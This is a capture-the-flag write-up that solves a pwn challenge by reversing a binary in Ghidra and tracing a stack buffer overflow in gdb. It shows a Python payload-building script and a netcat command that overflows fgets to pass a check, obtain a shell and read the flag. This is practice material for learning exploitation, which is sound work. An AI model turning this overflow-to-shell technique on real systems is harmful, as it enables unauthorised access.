# Chamber of Secrets

## Pwn: 75 Points

## Challenge

Enter the secret and get the flag!

`nc challenges.laptophackingcoffee.org 2341`

Credit: Tux#1576

[ [secret][1] ]

## Solution

Download the secret file. Check the file type:
```
$ file secret
secret: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de09bbeb8ec1d02060e4f82bcb4dc54ebcec4f53, stripped
```

It's an ELF executable. Add run permissions. Run it:
```
$ chmod +x secret
$ ./secret
Enter the secret: my_secret
You did not pass.
```

Try `strings` and `hexdump`. Nothing interesting:
```
$ strings secret | less
$ hexdump -C secret | less
```

Open the elf file in Ghidra. Below is the discovered main function. Variables have been renamed for readability.
```c
int main(void)
{
  int chamberResult;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  chamberResult = chamberOfSecrets();
  if (chamberResult == 0) {
    printf("You did not pass.");
  }
  else {
    printf("You have passed.");
    system("/bin/sh");
  }
  return 0;
}
```

The `main()` function calls the `chamberOfSecrets()` function and uses the result to allow or disallow access to a shell: `system("/bin/sh")`.

Locate the `chamberOfSecrets()` function. All of the variables are declared at the start of the function. In memory, all of these variables will be right next to each other when they get added onto the stack. 
```c
int chamberOfSecrets(void)
{
  int returnValue;
  char userInput[104];
  int x159;
  int x2a6;
  int x4c;
  int x1ed;
  ...
```

After the declarations, the variables are initialized from `1` to `0x1a` (26 decimal):
```c
  ...
  xea = 1;
  x1282 = 2;
  x7b = 3;
  ...
  x2a6 = 0x19;
  x159 = 0x1a;
  ...
```

After the initializations is the vulnerability: `fgets`. The `fgets` function reads up to `0x100` (256) characters. This is a lot more than the 104 byte buffer for the input: `char userInput[104]`. Therefore, `fgets` allows the stack to be overwritten.
```c
  printf("Enter the secret: ");
  fgets(userInput, 0x100, stdin);
```

The function then checks for specific values for each of the 26 variables initialized earlier. If all variables match then the function returns `1` and grants access to the shell. Therefore the goal is to overflow the input and set the adjacent variables to the expected values.

```c
  if (xea == 0xea && x1282 == 0x1282 && x7b == 0x7b && x21e == 0x21e &&
      x147a2 == 0x147a2 && x7c3 == 0x7c3 && x62 == 0x62 && x0 == 0 && x20 == 0x20 &&
      x463 == 0x463 && x20p2 == 0x20 && x62p2 == 0x62 && x345 == 0x345 && x1d == 0x1d &&
      xe7 == 0xe7 && x3cd == 0x3cd && x1 == 1 && x4fc == 0x4fc && d3000 == 3000 &&
      x17 == 0x17 && x3cc == 0x3cc && x29a == 0x29a && x1ed == 0x1ed && x4c == 0x4c &&
      x2a6 == 0x2a6 && x159 == 0x159)
  {
    returnValue = 1;
  }
  else
  {
    returnValue = 0;
  }
  return returnValue;
}
```

Write a python script to take advantage of this vulnerability. Here are the steps:

1. Overflow the `userInput` var
2. Overwrite the vars following `userInput` with the correct values
3. Take control of the shell

**Step 1: Overflow `userInput`**

Create a new file called **payload**. Enter a bunch of "A"s and save:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
Run the program with the payload:
```
$ ./secret < payload
Enter the secret: Segmentation fault (core dumped)
```

**Segmentation fault**: In computing, a segmentation fault (often shortened to segfault) or access violation is a fault, or failure condition, raised by hardware with memory protection, notifying an operating system the software has attempted to access a restricted area of memory (a memory access violation). -- [Wikipedia](https://en.wikipedia.org/wiki/Segmentation_fault)

The number of "A"s entered caused a segmentation fault, meaning that the program tried to write over a restricted area of memory. 

Compile and examine the [decompiled][2] code from Ghidra in gdb. Run the program with the payload:
```
$ gcc decompiled.c -o decompiled
$ gdb decompiled
(gdb) run < payload
...
Enter the secret: 
*** stack smashing detected ***: <unknown> terminated

Program received signal SIGABRT, Aborted.
```

Gdb detected the buffer overflow and terminated the program:
> *** stack smashing detected ***

To disable this protection, recompile the program with the `-fno-stack-protector` flag. Run gdb again. Problem solved:
```
$ gcc -fno-stack-protector decompiled.c -o decompiled
$ gdb decompiled
(gdb) run < payload
Enter the secret:
Program received signal SIGSEGV, Segmentation fault.
```

Set a breakpoint at the `chamberOfSecrets` function call. Run with payload then step into the function:
```
0x555555554b70 <main+68>    call   0x55555555484a <chamberOfSecrets>
...
(gdb) layout asm
(gdb) break *main+68
(gdb) run < payload

Breakpoint 3, 0x0000555555554b70 in main ()
(gdb) si
0x000055555555484a in chamberOfSecrets ()
```

Set a breakpoint at the instruction just after the `fgets` call. This will pause the program after the payload is read in by `fgets`, which allows further investigation of the overwritten variables.
```
0x5555555548c2 <chamberOfSecrets+232>   call   0x5555555546b0 <fgets@plt>
0x5555555548c7 <chamberOfSecrets+237>   mov    eax,DWORD PTR [rbp-0x6c]
...
(gdb) break *chamberOfSecrets+237
(gdb) continue
Continuing.
Enter the secret:
Breakpoint 2, 0x00005555555548c7 in chamberOfSecrets ()
```

At this point, the buffer is overflowed and the stack variables are overwritten. These are the stack writing instructions:
```
0x5555555547e5 <chamberOfSecrets+11>    mov    DWORD PTR [rbp-0x8],0x1
0x5555555547ec <chamberOfSecrets+18>    mov    DWORD PTR [rbp-0xc],0x2
0x5555555547f3 <chamberOfSecrets+25>    mov    DWORD PTR [rbp-0x10],0x3
0x5555555547fa <chamberOfSecrets+32>    mov    DWORD PTR [rbp-0x14],0x4 
```

These are the stack values. They are all "A"s (0x41 hex):
```
(gdb) x /8wx $rbp-0x14
0x7fffffffdc7c: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdc8c: 0x41414141      0x41414141      0x41414141      0x41414141
```

**Step 2. Overwrite `userInput` Vars with the Correct Values**

Currently, the payload just sends a bunch of "A"s. Fix this to send the correct data. The variables in [decompiled.c][2] have their name because that's the value that the `if` block expects:
```c
int x159;
int x2a6;
int x4c;
...
if (x4c == 0x4c && x2a6 == 0x2a6 && x159 == 0x159)
```

First, add the "A"s. The `userInput` char array is 104 bytes long. This char array needs to be filled before the other variables can be overwritten. Add 104 "A"s to the payload.

Next, save all the expected values into a file: [code.txt](code.txt). Open this file in python, loop through all the values, pack them into bytes, and save the payload to a file. The resulting script looks like this:
```python
#!/bin/python3
import sys
import struct
import socket

offset = 104
payload = bytes("A"*offset, 'utf-8')
with open("code.txt", 'r') as handle:
    for line in handle:
        hexValue = line.strip()
        intValue = int(hexValue,16)
        packedInt = struct.pack('<I', intValue)
        payload += packedInt

payload += struct.pack('c', b'\n')

# Write payload to file
with open('payload.bin', 'wb') as pfile:
    pfile.write(payload)
```
Note that the `offset` value may need to be tweaked a bit (+12) for the decompiled version. Need to investigate why this is. But the `offset` should be set to 104 for the remote payload. 

Run the script. It will create a **payload.bin** file. Send the payload to the decompiled program:
```
$ python3 exploit.py
$ ./decompiled < payload.bin
Enter the secret: You have passed.
```

"You have passed". If desired, verify that the variables have the intended values by using gdb as described earlier.

Verify that the payload works on the remote host:
```
$ cat payload.bin | nc challenges.laptophackingcoffee.org 2341
Enter the secret: You have passed.
```

**Step 3: Take Control of the Shell**

Per [LiveOverflow's instruction][3], chain a `cat` command after the initial `cat payload`:
```
$ (cat payload; cat) | nc challenges.laptophackingcoffee.org 2341
Enter the secret: You have passed.
whoami
/bin/sh: 2: whoami: not found

ls
bin
dev
flag.txt
lib
lib32
lib64
secret

cat flag.txt
LHC{y0u_expl0it3d_bu553r_0v3rfl0w!!!}
```

## Resources
* [First Exploit! Buffer Overflow with Shellcode - bin 0x0E][3]
* https://stackoverflow.com/questions/1345670/stack-smashing-detected
* https://docs.python.org/3/library/struct.html
* https://stackoverflow.com/questions/10483544/stopping-at-the-first-machine-code-instruction-in-gdb

[1]:secret
[2]:decompiled.c
[3]:https://www.youtube.com/watch?v=HSlhY4Uy8SA